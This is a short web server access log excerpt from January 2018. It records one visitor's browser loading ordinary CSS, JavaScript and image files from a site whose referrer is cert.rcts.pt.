153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /templates/beez_20/css/nature.css HTTP/1.1" 200 19417 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /plugins/content/attachments/attachments_refresh.js HTTP/1.1" 200 1835 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /templates/beez_20/javascript/md_stylechanger.js HTTP/1.1" 200 2104 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /templates/beez_20/javascript/hide.js HTTP/1.1" 200 8145 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /media/system/css/system.css HTTP/1.1" 200 1446 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
153.146.195.3 - - [23/Jan/2018:09:00:13 +0000] "GET /images/membrorede.jpg HTTP/1.1" 200 13448 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
